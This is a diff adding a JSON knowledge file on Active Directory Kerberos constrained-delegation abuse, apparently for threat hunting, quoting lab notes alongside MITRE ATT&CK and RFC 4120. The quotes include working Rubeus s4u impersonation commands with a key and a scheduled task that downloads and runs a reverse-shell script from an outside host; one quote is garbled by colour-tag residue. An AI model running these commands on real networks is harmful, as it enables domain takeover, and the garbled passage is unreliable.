@@ -1,0 +1,138 @@
+{
+ "class_id": "ad_kerberos",
+ "items": [
+  {
+   "item_key": "ad_kerberos.technique.tested_page_fde14a42_6698_4fce_85a0_e12fd",
+   "kind": "technique",
+   "claim": "Enumerating both computer and user accounts that are trusted to authenticate for delegation (msDS-AllowedToDelegateTo) surfaces principals that can be turned into arbitrary-user access to the SPNs listed against them, including CIFS file shares.",
+   "body": "Enumerating both computer and user accounts that are trusted to authenticate for delegation (msDS-AllowedToDelegateTo) surfaces principals that can be turned into arbitrary-user access to the SPNs listed against them, including CIFS file shares.\n\nHackTricks reference: fde14a42 (notion:fde14a42-6698-4fce-85a0-e12fd1672c65)",
+   "disproof": "No account is returned by the constrained-delegation enumeration, or the S4U request against the listed SPN is refused by the KDC.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#fde14a42-6698-4fce-85a0-e12fd1672c65",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "page fde14a42-6698-4fce-85a0-e12fd1672c65\n\nEnumerating Constrained Delegation using PowerView\n\nGet-DomainComputer -TrustedToAuth | select name\n\nUntitled\n\nWe have the Admin SRV computer have Constrained Delegation\n\nLet\u2019s Check the users have Constrained Delegation\n\nGet-DomainUser -TrustedToAuth | select name \n\nUntitled\n\nAs we see we have the websvc user have Constrained Delegation\n\nNow let\u2019s understand how it works\n\nUntitled\n\nIf we compromised the user websvc we can access the file server (CIFS) as any user in the domain including Domain Admins\n\nNow let\u2019s use Rubeus to abuse the Constrained Delegation\n\n.\\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /nowrap /ptt\n\nUntitled\n\nNotice that we got a TGT as Administrator for the SPN CIFS\n\nnow let\u2019s list the tickets we have\n\nklist\n\nUntitled\n\nAmazing we have the Administrator Ticket \n\nLet\u2019s try to list the contents of the dcorp-mssql server\n\nls \\\\dcorp-mssql.dollarcorp.moneycorp.local\\C$\n\nUntitled\n\nYeah We did it !"
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1558/003/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "[1] [2] Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
+     "source_type": "research",
+     "host": "www.rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "Standards Track [Page 82] RFC 4120 Kerberos V5 July 2005 The key usage value for encrypting this field is 3 in an AS-REP message, using the client's long-term key or another key selected via pre-authentication mechanisms."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
+     "source_type": "research",
+     "host": "rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "Standards Track [Page 82] RFC 4120 Kerberos V5 July 2005 The key usage value for encrypting this field is 3 in an AS-REP message, using the client's long-term key or another key selected via pre-authentication mechanisms."
+    }
+   ]
+  },
+  {
+   "item_key": "ad_kerberos.variant.tested_luckily_microsoft_didn_t_validate",
+   "kind": "variant",
+   "claim": "Because the KDC does not validate the target service against the delegation grant, a constrained-delegation request nominally for one SPN can be answered with a ticket for a different SPN - the SPN actually present in the returned ticket is the proof the substitution succeeded.",
+   "body": "Because the KDC does not validate the target service against the delegation grant, a constrained-delegation request nominally for one SPN can be answered with a ticket for a different SPN - the SPN actually present in the returned ticket is the proof the substitution succeeded.\n\nHackTricks reference: fde14a42 (notion:fde14a42-6698-4fce-85a0-e12fd1672c65)",
+   "disproof": "The issued service ticket names only the SPN that was requested, or the KDC rejects the alternate service outright.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#fde14a42-6698-4fce-85a0-e12fd1672c65",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "Luckily Microsoft didn\u2019t validate the service we need so we can ask trick the server to give us access to another service!\n\nlet\u2019s explain with Rubeus\n\n.\\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /altservice:host /nowrap /ptt\n\nUntitled\n\nAs we see we asked for access to CIFS but we got a ticket for HOST Service\n\nlet\u2019s list the Tickets\n\nklist\n\nUntitled\n\nNow let\u2019s go and try to make a schedule task to give us reverse shell\n\nschtasks /create /S dcorp-mssql.dollarcorp.moneycorp.local /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN \"STCheck\" /TR \"powershell.exe -c 'IEX(iwr http://172.16.100.22/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'\"\n\nUntitled\n\nNow let\u2019s start the task\n\nschtasks /Run /S dcorp-mssql.dollarcorp.moneycorp.local /TN \"STCheck\"\n\nUntitled\n\nlet\u2019s go back to our listener \n\nUntitled\n\nHooray we are Local admin in the dcorp-mssql machine \n\nlet\u2019s add my user to the local admins group\n\nnet localgroup Administrators \"student422\" /add\n\nUntitled\n\nYes we made it!"
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1558/003/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "[1] [2] Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
+     "source_type": "research",
+     "host": "www.rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "Standards Track [Page 82] RFC 4120 Kerberos V5 July 2005 The key usage value for encrypting this field is 3 in an AS-REP message, using the client's long-term key or another key selected via pre-authentication mechanisms."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
+     "source_type": "research",
+     "host": "rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "Standards Track [Page 82] RFC 4120 Kerberos V5 July 2005 The key usage value for encrypting this field is 3 in an AS-REP message, using the client's long-term key or another key selected via pre-authentication mechanisms."
+    }
+   ]
+  },
+  {
+   "item_key": "ad_kerberos.signal.tested_page_123b6147_5e20_47db_bda7_4348a",
+   "kind": "signal",
+   "claim": "A TGT is encrypted under the KRBTGT account key while a TGS service ticket is encrypted under the target service account key, so the identity of the key protecting a captured ticket tells the hunter which account and which privilege tier it grants.",
+   "body": "A TGT is encrypted under the KRBTGT account key while a TGS service ticket is encrypted under the target service account key, so the identity of the key protecting a captured ticket tells the hunter which account and which privilege tier it grants.\n\nHackTricks reference: 123b6147 (notion:123b6147-5e20-47db-bda7-4348a87710ba)",
+   "disproof": "A captured ticket decrypts under neither the KRBTGT key nor the named target service key, indicating it is not a standard Kerberos TGT or TGS.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#123b6147-5e20-47db-bda7-4348a87710ba",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "page 123b6147-5e20-47db-bda7-4348a87710ba\n\nHow Kerberos works\n\nyellowhsend AS-REQ to the KDCwhich bluehuser NTLM Hash with the tealhtimestamp is encrypted and the bluehconverted to NTLM hash1) The password of the user is \n\nUntitled\n\nyellowhsend to the user in AS-REP and bluehencrypted using the NTLM Hash of the KRBTGT account) which is orangehTGT (tealhTicket Granting Ticket with a yellowhThe KDC reply2) \n\nUntitled\n\nyellowh sent to KDC as TGS-REQ ) andorangehTGS (tealhrequest a Ticket Granting Service and yellowhKDC to the bluehencrypted using the KRBTGT account NTLM Hash which is yellowhuser send the TGT3) The \n\nUntitled\n\nyellowhsend it to user as TGS-REP and bluehtarget service account NTLM Hash the tealhencrypted using which is yellowhKDC response with a TGS4) The \n\nUntitled\n\nyellowhAP-REQ in tealhserver hosting the service to the yellowhuser send the TGS5) The \n\nUntitled\n\nyellowhKRB_AS_REQ\n\nbrownh user is trying to get TGT will know that theyellowhKDC so that the bluehSPN KRBTGT and the user specifies the tealhtimestamp encrypted with the user Hash and the tealhsends his username yellowhuserThe \n\nUntitled\n\nyellowhKRB_AS_REP\n\nbluehencrypted with the User Hash tealhsession key and the bluehencrypted with the KRBTGT Hashthat is yellowhTGT reply contains the yellowhKDCThe \n\nUntitled\n\nyellowhKRP_TGS_REQ\n\norangehrequest the TGS for he want to purplehspecify the SPN and tealhthe TGT also sends pinkhAS_REP received from the bluehencrypted with the session key tealhtimestampand tealhusername sends the yellowhThe User \n\nUntitled\n\nyellowhKRP_TGS_REP\n\nbluehencrypted with the Session Key from the AS_REP tealhService Session Key and also replies with the redhTarget Service Hashbluehencrypted with the that is tealhTGS replies with the yellowhThe KDC\n\nUntitled\n\nKRP_AP_REQ\n\nbluehencrypted with the Service Session Keytealh and timestamptealhusername and sends the redhTarget Service Hash tealhencrypted with the tealhTGS sends the yellowhThe user\n\nUntitled"
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1558/003/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "[1] [2] Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
+     "source_type": "research",
+     "host": "www.rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "Standards Track [Page 82] RFC 4120 Kerberos V5 July 2005 The key usage value for encrypting this field is 3 in an AS-REP message, using the client's long-term key or another key selected via pre-authentication mechanisms."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
+     "source_type": "research",
+     "host": "rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "Standards Track [Page 82] RFC 4120 Kerberos V5 July 2005 The key usage value for encrypting this field is 3 in an AS-REP message, using the client's long-term key or another key selected via pre-authentication mechanisms."
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "mitre.org",
+  "rfc-editor.org",
+  "source-guide"
+ ],
+ "sources": [
+  "https://tested-corleggy-562.notion.site/?pvs=4#fde14a42-6698-4fce-85a0-e12fd1672c65",
+  "https://attack.mitre.org/techniques/T1558/003/",
+  "https://www.rfc-editor.org/rfc/rfc4120.html",
+  "https://www.rfc-editor.org/rfc/rfc4120.html",
+  "https://tested-corleggy-562.notion.site/?pvs=4#fde14a42-6698-4fce-85a0-e12fd1672c65",
+  "https://attack.mitre.org/techniques/T1558/003/",
+  "https://www.rfc-editor.org/rfc/rfc4120.html",
+  "https://www.rfc-editor.org/rfc/rfc4120.html",
+  "https://tested-corleggy-562.notion.site/?pvs=4#123b6147-5e20-47db-bda7-4348a87710ba",
+  "https://attack.mitre.org/techniques/T1558/003/",
+  "https://www.rfc-editor.org/rfc/rfc4120.html",
+  "https://www.rfc-editor.org/rfc/rfc4120.html"
+ ]
+}
